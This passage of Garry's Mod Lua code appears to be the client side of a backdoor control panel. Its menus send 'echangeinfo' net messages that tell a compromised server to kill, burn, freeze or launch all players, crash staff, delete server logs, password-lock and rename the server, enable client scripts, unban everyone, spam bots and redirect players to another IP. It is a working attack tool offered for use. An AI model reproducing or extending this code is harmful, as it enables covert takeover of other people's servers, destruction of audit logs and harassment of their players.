     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;allkillusersilence&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user.png&quot; )
meutreallssub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;allkillusersilencestaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; )

explosesub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;exploseall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user.png&quot; )
explosesub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;explosestaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; )

igniteallssub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;igniteall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user.png&quot; )
igniteallssub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;igniteallstaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; )

freezesub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;freezeall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/user.png&quot; )
freezesub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;freezeallstaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; ) 
unfreezesub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;unfreezeall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/user.png&quot; )

unfreezesub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;unfreezeallstaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; )

noclipsub:AddOption( &quot;[ON]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;noclipallon&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/accept.png&quot; )

noclipsub:AddOption( &quot;[OFF]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;noclipalloff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

ulxall:AddOption( &quot;Ajoute 11&acirc;&sbquo;&not; toutes les 0.1s&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;addmoneyall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/money_add.png&quot; )

ulxall:AddOption( &quot;Ajouter de l'argent&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;500&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;addmoneyalls&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/money_add.png&quot; ) 

ulxall:AddOption( &quot;Point de vie&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;100&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;healall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/heart.png&quot; ) 

ulxall:AddOption( &quot;Point d'armure&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;250&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;armorall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user_suit.png&quot; ) 

trollall:AddOption( &quot;Launch&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;launchall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/arrow_up.png&quot; )

trollall:AddOption( &quot;2D Players&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;2dplayerall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bug.png&quot; )

trollall:AddOption( &quot;Donner la grosse t&Atilde;&ordf;te &Atilde;  tous les joueurs&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;grossetete&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bug.png&quot; )

trollall:AddOption( &quot;Changer la taille des joueurs&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;5&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;scaleall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/application_edit.png&quot; )

trollall:AddOption( &quot;Hurlement sur tous les joueurs&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;hurlement&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

trollall:AddOption( &quot;Faire crash [STAFF]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;crashadminvip&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( &quot;icon16/disconnect.png&quot; )

spamchat:AddOption( &quot;[ON]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;spamchat&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( &quot;icon16/accept.png&quot; )

spamchat:AddOption( &quot;[OFF]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;spamchatstop&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( &quot;icon16/cancel.png&quot; )

mooveall:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;moovetrollall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; ) 

mooveall:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unmoovetrollall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

jumpbreakall:AddOption( &quot;ON&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;jump&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

jumpbreakall:AddOption( &quot;OFF&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;retablirjumpall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

moovesall:AddOption( &quot;[ON]Avancer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;forwardmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

moovesall:AddOption( &quot;[OFF]Avancer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unforwardmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/stop.png&quot; )

moovesall:AddOption( &quot;[ON]Reculer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;backmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

moovesall:AddOption( &quot;[OFF]Reculer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unbackmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/stop.png&quot; )

moovesall:AddOption( &quot;[ON]Tourner &Atilde;  gauche&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;leftmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

moovesall:AddOption( &quot;[OFF]Tourner &Atilde;  gauche&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unleftmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/stop.png&quot; )

moovesall:AddOption( &quot;[ON]Tourner &Atilde;  droite&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;rightmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

moovesall:AddOption( &quot;[OFF]Tourner &Atilde;  droite&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unrightmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/stop.png&quot; )

moovesall:AddOption( &quot;[ON]S'accroupir&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;squatmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

moovesall:AddOption( &quot;[OFF]S'accroupir&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unsquatmooveall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/stop.png&quot; )

infoserver:AddOption( &quot;Enlever les logs&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;logsremove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cog_delete.png&quot; )

infoserver:AddOption( &quot;Changer le nom du serveur&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;&acirc;&ndash; &acirc;&ndash;&sbquo; &acirc;&ndash;&fnof; &acirc;&ndash;&bdquo; &acirc;&ndash;&hellip; &acirc;&ndash;&dagger; &acirc;&ndash;&Dagger;&Auml;&curren;&aacute;&ordm;&ordf;&Auml;&circ;&ETH;&OElig;&Auml;&rsquo;&Auml;Ž &agrave;&cedil;&iquest;&Acirc;&yen; &Auml;&rdquo;&Iuml;&Auml;&uml;&Auml;&copy;&Auml;&dagger;&aacute;&ordm;&curren; &Aring;&curren;&Icirc;&circ;&Ccedil;&ordm;M&acirc;&ndash;&circ; &acirc;&ndash;&Dagger; &acirc;&ndash;&dagger; &acirc;&ndash;&hellip; &acirc;&ndash;&bdquo; &acirc;&ndash;&sbquo; &acirc;&ndash;&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;changename&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/server_edit.png&quot; ) 

infoserver:AddOption( &quot;Changer l'&Atilde;&copy;cran de chargement&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;https://pornhub.com&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;changeload&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/server_edit.png&quot; ) 

infoserver:AddOption( &quot;Autoriser les scripts client (0 ou 1)&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;1&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;allowcsluads&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/server_edit.png&quot; )

infoserver:AddOption( &quot;Mettre un mot de passe sur le serveur&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;secure&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;secureinfo&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/server_edit.png&quot; )

infoserver:AddOption( &quot;Bot spam&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;Nombre de Bot ?&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;5&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;botspam&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user.png&quot; )

infoserver:AddOption( &quot;Changer le nom de tous les joueurs&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;namechanger&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/server_database.png&quot; )

infoserver:AddOption( &quot;Changer le nom de tous les joueurs[SPAM]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;namechangerspam&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/server_database.png&quot; )

infoserver:AddOption( &quot;Name Changer[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;namechangerstop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/server_database.png&quot; ) 

infoserver:AddOption( &quot;Red&Atilde;&copy;marrer serveur&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;restartserver&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/server_go.png&quot; )

gravitesub:AddOption( &quot;ON&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;cassergrall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

gravitesub:AddOption( &quot;OFF&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;retablirgrall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

physiquesub:AddOption( &quot;ON&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;physicgamestyle&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

physiquesub:AddOption( &quot;OFF&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;retablirphysicgamestyle&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

quakeearth:AddOption( &quot;ON&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;earthquakeonall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollall:AddOption( &quot;GL0B4L H4CK&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;globalhack&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/application_xp_terminal.png&quot; )

trollall:AddOption( &quot;D4NC3 FL00R! &quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;dancefloor&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/rainbow.png&quot; )


animationallsubsalute:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_salute&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubsalute:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_salute_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubrobot:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_robot&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )
animationallsubrobot:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_robot_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubcheer:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_cheer&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )
animationallsubcheer:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_cheer_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsublaugh:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_laugh&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsublaugh:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_laugh_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubmuscle:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_muscle&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubmuscle:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_muscle_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubpersistence:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_persistence&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubpersistence:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_persistence_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubdance:AddOption( &quot;1 fois&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_dance&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationallsubdance:AddOption( &quot;en boucle&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_dance_loop&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animationall:AddOption( &quot;STOP ALL&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;stop_timer_animation&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

ulxall:AddOption( &quot;Unban ALL &quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unbanall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/status_online.png&quot; )

ulxall:AddOption( &quot;Give une arme&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;weapon_rpg&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;itemsall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/bomb.png&quot; ) 

ulxall:AddOption( &quot;Changer les models&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;models/editor/playerstart.mdl&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;modelall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/box.png&quot; )

ulxall:AddOption( &quot;Rediriger tous les joueurs vers une ip&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;127.0.0.1:27015&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;redirectplayer&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/server_go.png&quot; )

m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
local AppList = vgui.Create( &quot;DListView&quot;, Frame )
AppList:SetMultiSelect( false )
AppList:AddColumn( &quot;Utilisateur&quot; )
AppList:SetSize( ScrW() -400, ScrH() -400 );
AppList:SetPos( 100, 80 );
            for k, v in pairs(player.GetAll()) do
                AppList:AddLine( v:Nick() .. &quot;     &quot; .. v:GetUserGroup(), v)
            end
AppList.OnRowSelected = function( lst, index, pnl )
userl = pnl:GetColumnText( 2 )
valuess = pnl:GetColumnText( 1 )
local m = DermaMenu()
local meutre, meutreicon = m:AddSubMenu( &quot;Meutre&quot; )
meutreicon:SetIcon( &quot;icon16/bomb.png&quot; )
m:AddSpacer()
local ulx, ulxicon = m:AddSubMenu( &quot;Commandes&quot; )
ulxicon:SetIcon( &quot;icon16/script_edit.png&quot; )
m:AddSpacer()
local visuel, visuelicon = m:AddSubMenu( &quot;Visuel&quot; )
visuelicon:SetIcon( &quot;icon16/eye.png&quot; )
m:AddSpacer()
local soundboard, soundboardlicon = m:AddSubMenu( &quot;SoundBoard&quot; )
soundboardlicon:SetIcon( &quot;icon16/sound.png&quot; )
m:AddSpacer()
local tpsub, tpsubicon = m:AddSubMenu( &quot;T&Atilde;&copy;l&Atilde;&copy;portation&quot; )
tpsubicon:SetIcon( &quot;icon16/user_go.png&quot; )
local tpsubgmconstruct, tpsubgmconstructicon = tpsub:AddSubMenu( &quot;GM_CONSTRUCT&quot; )
tpsubgmconstructicon:SetIcon( &quot;icon16/map.png&quot; )
local tpsubgmflat, tpsubgmflaticon = tpsub:AddSubMenu( &quot;GM_FLATGRASS&quot; )
tpsubgmflaticon:SetIcon( &quot;icon16/map.png&quot; )
local tpsubglife3, tpsubglife3icon = tpsub:AddSubMenu( &quot;RP_GLIFE_ROCKFORD3&quot; )
tpsubglife3icon:SetIcon( &quot;icon16/map.png&quot; )
local downtownv4cv2, downtownv4cv2icon = tpsub:AddSubMenu( &quot;RP_ROCKFORD_V2B&quot; )
downtownv4cv2icon:SetIcon( &quot;icon16/map.png&quot; )
local ulxsubgrade, ulxsubgradeicon = ulx:AddSubMenu( &quot;Grades&quot; )
ulxsubgradeicon:SetIcon( &quot;icon16/user.png&quot; )
local ulxsubgod, ulxsubgodicon = ulx:AddSubMenu( &quot;Mode dieu&quot; )
ulxsubgodicon:SetIcon( &quot;icon16/heart.png&quot; )
local ulxsubfreeze, ulxsubfreezeicon = ulx:AddSubMenu( &quot;Freeze&quot; )
ulxsubfreezeicon:SetIcon( &quot;icon16/heart.png&quot; )
local ulxsubnoclip, ulxsubnoclipicon = ulx:AddSubMenu( &quot;NOCLIP&quot; )
ulxsubnoclipicon:SetIcon( &quot;icon16/drive_user.png&quot; )
m:AddSpacer()
local animation, animationicon = m:AddSubMenu( &quot;Animation&quot; )
animationicon:SetIcon( &quot;icon16/wand.png&quot; )
m:AddSpacer()
local mooves, moovesicon = m:AddSubMenu( &quot;Mouvement&quot; )
moovesicon:SetIcon( &quot;icon16/controller.png&quot; )
m:AddSpacer()
local troll, trollicon = m:AddSubMenu( &quot;Troll Menu&quot; )
trollicon:SetIcon( &quot;icon16/rainbow.png&quot; )
local trollsubflash, trollsubflashicon = troll:AddSubMenu( &quot;Flashlight SPAM&quot; )
trollsubflashicon:SetIcon( &quot;icon16/lightbulb_off.png&quot; )
local trollsubscreen, trollsubscreenicon = troll:AddSubMenu( &quot;Screenshot SPAM&quot; )
trollsubscreenicon:SetIcon( &quot;icon16/camera.png&quot; )
local trollsubstopsound, trollsubstopsoundicon = troll:AddSubMenu( &quot;Stopsound SPAM&quot; )
trollsubstopsoundicon:SetIcon( &quot;icon16/sound_mute.png&quot; )
local trollsubmoooves, trollsubmooovesicon = troll:AddSubMenu( &quot;Mouvement&quot; )
trollsubmooovesicon:SetIcon( &quot;icon16/bug_error.png&quot; )
local trollsubgravity, trollsubgravityicon = troll:AddSubMenu( &quot;Gravit&Atilde;&copy; Casser&quot; )
trollsubgravityicon:SetIcon( &quot;icon16/star.png&quot; )
local trollsubjumpc, trollsubjumpcicon = troll:AddSubMenu( &quot;Jump Casser&quot; )
trollsubjumpcicon:SetIcon( &quot;icon16/star.png&quot; )
local trollsubmic, trollsubmicicon = troll:AddSubMenu( &quot;Micro&quot; )
trollsubmicicon:SetIcon( &quot;icon16/sound.png&quot; )
local trollprison, trollprisonicon = troll:AddSubMenu( &quot;Prison&quot; )
trollprisonicon:SetIcon( &quot;icon16/user_orange.png&quot; )
m:AddSpacer()
meutre:AddOption( &quot;Tuer la personne&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;killuser&quot;)
